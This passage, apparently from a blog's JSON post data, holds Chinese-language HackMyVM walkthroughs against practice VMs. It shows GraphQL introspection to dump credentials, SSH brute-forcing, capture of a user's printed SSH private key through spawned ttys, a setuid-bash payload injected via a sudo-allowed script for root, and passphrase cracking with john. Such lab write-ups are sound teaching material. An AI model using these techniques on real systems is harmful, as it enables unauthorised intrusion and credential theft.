projectdiscovery/nuclei-templates\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1702 (Reduced 1602 Requests)\n[INF] Using Interactsh Server: oast.pro\n[graphql-field-suggestion] [http] [info] http://192.168.205.138/graphql\n[graphql-alias-batching] [http] [info] http://192.168.205.138/graphql\n[graphql-detect] [http] [info] http://192.168.205.138/graphql [paths='/graphql']\n[waf-detect:securesphere] [http] [info] http://192.168.205.138\n[ssh-password-auth] [javascript] [info] 192.168.205.138:22\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.138:22\n[ssh-auth-methods] [javascript] [info] 192.168.205.138:22 ['['publickey','password']']\n[ssh-server-enumeration] [javascript] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']\n[CVE-2023-48795] [javascript] [medium] 192.168.205.138:22 ['Vulnerable to Terrapin']\n[openssh-detect] [tcp] [info] 192.168.205.138:22 ['SSH-2.0-OpenSSH_9.2p1 Debian-2']\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.138\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.138\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.138\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.138\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.138\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.138\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.138\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.138\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.138\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.138\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.138\n[tech-detect:express] [http] [info] http://192.168.205.138                                                                       \n```\n\n\u53ef\u4ee5\u770b\u5230\u548c**graphql**\u6709\u5173\uff0c\u53bb[hacktricks](https://book.hacktricks.wiki/)\u641c\u7d22\u4f1a\u6709\u4e00\u7bc7[\u76f8\u5173\u7684\u6587\u7ae0](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/graphql.html)\n\n![Image](https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1)\n\n\u8fdb\u884c\u5c1d\u8bd5\n\n![Image](https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a)\n\n\u786e\u5b9e\u662f**GraphQL**\u670d\u52a1\uff0c\u8fdb\u4e00\u6b65\u6d4b\u8bd5\n\n```bash\nPOST /graphql HTTP/1.1\nHost: 192.168.205.138\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.205.138/\nContent-Type: application/json\nContent-Length: 106\nOrigin: http://192.168.205.138\nDNT: 1\nSec-GPC: 1\nConnection: keep-alive\nPriority: u=0\n\n{'query':'{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}'}\n```\n\n![Image](https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5)\n\n\u5b58\u5728**\u7528\u6237\u540d**\u548c**\u5bc6\u7801**\uff0c\u6211\u4eec\u5c1d\u8bd5\u63d0\u53d6\n\n```bash\n\u7701\u7565\n{'query':'{users(id: 1) {username   password }}'}\n```\n\n![Image](https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab)\n\n\u62ff\u53bb\u7206\u7834\u6a21\u5757\u7206\u7834\n\n![Image](https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026)\n\n\u5c1d\u8bd5\u767b\u5f55ssh\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh malo@192.168.205.138                        \nThe authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.\nED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.\nmalo@192.168.205.138's password: \nLinux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\n[oh-my-zsh] Would you like to update? [Y/n] n\n[oh-my-zsh] You can update manually by running `omz update`\n\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ id\nuid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)\n```\n\n# 3.\u63d0\u6743\n\n```bash\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ sudo -l\nsudo: unable to resolve host flossy: Name or service not known\n[sudo] password for malo: \nSorry, user malo may not run sudo on flossy.\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ ls -la                                                                                                                         1 \u21b5\ntotal 216\ndrwxr-xr-x  5 malo malo   4096 Jan 17 10:03 .\ndrwxr-xr-x  4 root root   4096 Oct  6  2023 ..\n-rw-------  1 malo malo      4 Oct  7  2023 .bash_history\n-rw-r--r--  1 malo malo    220 Oct  6  2023 .bash_logout\n-rw-r--r--  1 malo malo   3526 Oct  6  2023 .bashrc\ndrwxr-xr-x  3 malo malo   4096 Oct  6  2023 .local\ndrwxr-xr-x 12 malo malo   4096 Oct  6  2023 .oh-my-zsh\n-rw-r--r--  1 malo malo    807 Oct  6  2023 .profile\ndrwx------  2 malo malo   4096 Oct 10  2023 .ssh\n-rw-r--r--  1 malo malo  51798 Jan 17 10:02 .zcompdump-flossy-5.9\n-r--r--r--  1 malo malo 119920 Jan 17 10:02 .zcompdump-flossy-5.9.zwc\n-rw-------  1 malo malo     63 Jan 17 10:03 .zsh_history\n-rw-r--r--  1 malo malo   3890 Oct  6  2023 .zshrc\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ cat .bash_history\ntty\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ cat .zsh_history           \n: 1737104526:0;id\n: 1737104577:0;sudo -l\n: 1737104613:0;ls -la\n: 1737104620:0;cat .bash_history\n: 1737104635:0;cat .zsh_history\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/su\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/umount\n/usr/sbin/pppd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/polkit-1/polkit-agent-helper-1\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ /sbin/getcap -r / 2>/dev/null                                                                                                  1 \u21b5\n/usr/bin/ping cap_net_raw=ep\n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ ss -tuln | grep tcp\ntcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*        \ntcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        \ntcp   LISTEN 0      128             [::]:22           [::]:*        \n\u256d\u2500malo@flossy ~ \n\u2570\u2500$ cd /home      \n\u256d\u2500malo@flossy /home \n\u2570\u2500$ ls -la\ntotal 16\ndrwxr-xr-x  4 root   root   4096 Oct  6  2023 .\ndrwxr-xr-x 18 root   root   4096 Jul 22  2023 ..\ndrwxr-xr-x  5 malo   malo   4096 Jan 17 10:06 malo\ndrwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 sophie\n\u256d\u2500malo@flossy /home \n\u2570\u2500$ cd sophie \n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ ls -al\ntotal 56\ndrwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 .\ndrwxr-xr-x  4 root   root   4096 Oct  6  2023 ..\n-rw-------  1 root   root    370 Oct 10  2023 .bash_history\n-rw-r--r--  1 sophie sophie  220 Oct  6  2023 .bash_logout\n-rw-r--r--  1 sophie sophie 3526 Oct  6  2023 .bashrc\ndrwxr-xr-x  3 sophie sophie 4096 Oct  6  2023 .local\n-rwxr-----  1 root   sophie  962 Oct  6  2023 network\ndrwxr-xr-x 12 sophie sophie 4096 Oct  6  2023 .oh-my-zsh\n-rw-r--r--  1 sophie sophie  807 Oct  6  2023 .profile\n-rw-r--r--  1 sophie sophie   66 Oct  7  2023 .selected_editor\ndrwx------  2 sophie sophie 4096 Oct 10  2023 .ssh\n-rwxr-xr-x  1 sophie sophie  630 Oct 10  2023 SSHKeySync\n-rwx------  1 sophie sophie   33 Oct 10  2023 user.txt\n-rw-r--r--  1 sophie sophie 3890 Oct  6  2023 .zshrc\n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ cat SSHKeySync\n#!/bin/bash\n\n# This script must run every minute in pre-prod\n\nsend_private_key() {\n    local user_name='$1'\n    local key_path='/home/$user_name/.ssh/id_rsa'\n    local admin_tty='/dev/pts/24'\n\n    if [ -f '$key_path' ]; then\n        if [ -w '$admin_tty' ]; then\n            cat '$key_path' > '$admin_tty'\n        else\n            echo 'Error: Unable to write to $admin_tty'\n        fi\n    else\n        echo 'Error: The private key for $user_name doesn't exist.'\n    fi\n}\n\nwhile true ; do\n  USER='sophie'\n  echo 'Sending $USER's private key to a high-privileged TTY for quick testing...'\n  send_private_key '$USER'\n  sleep 1m\ndone\n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ tty\n/dev/pts/0\n```\n\n\u811a\u672c\u7684\u5b9e\u73b0\u4e86\u6bcf\u5206\u949f\u5c06**sophie**\u7684\u79c1\u94a5\u53d1\u9001\u5230`/dev/pts/24`\u4e2d\uff0c\u6211\u4eec\u5c1d\u8bd5\u5229\u7528\n\n```bash\n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ ls /dev/pts/                                                                                                                   2 \u21b5\n\n0  ptmx\n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ script /dev/null\nScript started, output log file is '/dev/null'.\n\u256d\u2500malo@flossy /home/sophie \n\u2570\u2500$ ls /dev/pts/  \n\n0  1  ptmx\n\u256d\u2500malo@flossy /tmp \n\u2570\u2500$ cat a.sh\n#!/bin/bash\n\nfor i in {1..27}\ndo\n    script /dev/pts/$i &\ndone\n\u256d\u2500malo@flossy /tmp \n\u2570\u2500$ chmod +x a.sh \n\u256d\u2500malo@flossy /tmp \n\u2570\u2500$ bash a.sh \n\n\u7701\u7565\n\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\\=\\=\n-----END OPENSSH PRIVATE KEY-----\n```\n\n\u5c06\u5bc6\u94a5\u5199\u5165`id_rsa`\u4e2d\uff0c\u8fde\u63a5ssh\uff08**\u5efa\u8bae\u91cd\u65b0\u5f00\u4e2akali\u7a97\u53e3\u8fdb\u884c\u8fde\u63a5\uff0c\u4e0d\u7136\u5b83\u4e00\u76f4\u5f39\u79c1\u94a5\u633a\u70e6\u7684**\uff09\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ ssh sophie@127.0.0.1 -i id_rsa \nThe authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.\nLinux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\n[oh-my-zsh] Would you like to update? [Y/n] n\n[oh-my-zsh] You can update manually by running `omz update`\n\u256d\u2500sophie@flossy ~ \n\u2570\u2500$ id\nuid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)\n```\n\n\u7ee7\u7eed\u8fdb\u884c\u63d0\u6743\n\n```bash\n\u256d\u2500sophie@flossy ~ \n\u2570\u2500$ sudo -l\nsudo: unable to resolve host flossy: Name or service not known\nMatching Defaults entries for sophie on flossy:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser sophie may run the following commands on flossy:\n    (ALL : ALL) NOPASSWD: /home/sophie/network*\n\u256d\u2500sophie@flossy ~ \n\u2570\u2500$ cat network           \n#!/bin/bash\n\n\nconnected_ip(){\n        connection_type=TCP\n        champ=2\n        ignores=LISTEN\n        lsof_args=-ni\n\n        port_local='[0-9][0-9][0-9][0-9][0-9]->'\n\n        lsof '$lsof_args' | grep $connection_type | grep -v '$ignores' |\n        awk '{print $9}' | cut -d : -f $champ | sort | uniq |\n        sed s/'^$port_local'//\n }\n\ndispatcher() {\n    for s in /opt/*; do\n        if [ -f '$s' ]; then\n            d='/etc/NetworkManager/dispatcher.d/$(basename $s)'\n            if [ ! -f '$d' ] || [ '$s' -nt '$d' ]; then\n                return 0\n            fi\n        fi\n    done\n    return 1\n}\n\nupdate() {\n    if [[ -z $(find /opt -type f) ]] ; then\n      exit 0\n    else\n      echo 'Updating scripts.'\n      cp /opt/* /etc/NetworkManager/dispatcher.d/\n      chmod +x /etc/NetworkManager/dispatcher.d/*\n      echo 'Scripts updated.'\n    fi\n}\n\n\n\ncase '${1}' in\nip)   connected_ip ;;\ndisp) dispatcher ; update ;;\n*)    echo 'Usage: ./$0 option' ;;\nesac\n```\n\n\u8fd9\u4e2a\u811a\u672c\u53ea\u7528\u5173\u6ce8\u5b83\u4f1a\u628a`/opt/`\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u590d\u5236\u5230`/etc/NetworkManager/dispatcher.d/`\u5e76\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u5c1d\u8bd5**\u6076\u610f\u4ee3\u7801\u6ce8\u5165**\n\n```bash\n\u256d\u2500sophie@flossy /opt\n\u2570\u2500\\$ echo 'chmod u+s /bin/bash' > a.sh\n\u256d\u2500sophie@flossy /opt \n\u2570\u2500$ chmod +x a.sh\n\u256d\u2500sophie@flossy /opt \n\u2570\u2500$ sudo /home/sophie/network disp \nsudo: unable to resolve host flossy: Name or service not known\nUpdating scripts.\nScripts updated.\n\u256d\u2500sophie@flossy /opt \n\u2570\u2500$ ls -la /etc/NetworkManager/dispatcher.d/\ntotal 3468\ndrwxr-xr-x 5 root root    4096 Jan 17 10:44 .\ndrwxr-xr-x 7 root root    4096 Oct  6  2023 ..\n-rwxr-xr-x 1 root root    2293 Mar  9  2023 01-ifupdown\n-rwxr-xr-x 1 root root      20 Jan 17 10:44 a.sh\ndrwxr-xr-x 2 root root    4096 Mar  9  2023 no-wait.d\ndrwxr-xr-x 2 root root    4096 Mar  9  2023 pre-down.d\ndrwxr-xr-x 2 root root    4096 Mar  9  2023 pre-up.d\n-rwxr-xr-x 1 root root 3518724 Jan 17 10:44 pspy\n\u256d\u2500sophie@flossy /opt \n\u2570\u2500$ cd /etc/NetworkManager/dispatcher.d/          \n\u256d\u2500sophie@flossy /etc/NetworkManager/dispatcher.d \n\u2570\u2500$ nmcli connection up lo\nConnection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)\n\u256d\u2500sophie@flossy /etc/NetworkManager/dispatcher.d \n\u2570\u2500$ ls -la /bin/bash                  \n-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash\n\u256d\u2500sophie@flossy /etc/NetworkManager/dispatcher.d \n\u2570\u2500$ bash -p                                 \nbash-5.2# id\nuid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)\n```\n\n![Image](https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7)sentence", "top": 0, "createdAt": 1751016788, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P103": {"htmlDir": "docs/post/hmv_friendly2.html", "labels": ["HackMyVM"], "postTitle": "hmv_friendly2", "postUrl": "post/hmv_friendly2.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/103", "commentNum": 0, "wordCount": 9411, "description": "# hmv_friendly2\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST\nNmap scan report for 192.168.205.138\nHost is up (0.00057s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 2.63 seconds\n\n```\n\n# 2.\u8e29\u70b9\n\n![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)\n\n\u5c1d\u8bd5\u7206\u7834\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md\n                                                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.138\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, txt, md]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   \n200      GET       91l      262w     2698c http://192.168.205.138/\n301      GET        9l       28w      319c http://192.168.205.138/assets => http://192.168.205.138/assets/\n301      GET        9l       28w      318c http://192.168.205.138/tools => http://192.168.205.138/tools/\n200      GET       91l      262w     2698c http://192.168.205.138/index.html\n200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png\n200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png\n200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png\n200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif\n301      GET        9l       28w      328c http://192.168.205.138/tools/documents => http://192.168.205.138/tools/documents/\n200      GET       29l       99w      813c http://192.168.205.138/tools/index.html\n200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html\n200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html\n200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html\n[####################] - 2m    622895/622895  0s      found:13      errors:1      \n[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ \n[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ \n[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ => Directory listing (add --scan-dir-listings to scan)\n```\n\n\u5176\u4e2d`/tools/`\u76ee\u5f55\uff0c\u6211\u4eec\u6bd4\u8f83\u611f\u5174\u8da3\n\n![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)\n\n\u6709\u4e00\u4e2a\u7591\u4f3c\u76ee\u5f55\u5305\u542b\u8def\u5f84\uff0c\u6211\u4eec\u52a0\u4e0a\u5c1d\u8bd5\n\n![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)\n\n\u518d\u5c1d\u8bd5\u53ef\u4e0d\u53ef\u4ee5\u4f7f\u7528**PHP \u8fc7\u6ee4\u5668\u94fe**\n\n![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)\n\n\u4e0d\u884c\uff0c\u90a3\u6211\u4eec\u8fd8\u662f\u53bb\u8bfb\u5b83\u5bc6\u94a5\u5427\n\n![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ vim id_rsa \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ chmod 600 id_rsa\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh gh0st@192.168.205.138 -i id_rsa\nThe authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.\nED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.\nEnter passphrase for key 'id_rsa': \n\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh2john id_rsa > hash                             \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nNo password hashes left to crack (see FAQ)\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john hash --show                                   \nid_rsa:celtic\n\n1 password hash cracked, 0 left\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh gh0st@192.168.205.138 -i id_rsa                \nEnter passphrase for key 'id_rsa': \nLinux friendly2 5.10.0-21-amd64 #1 SMP Debian 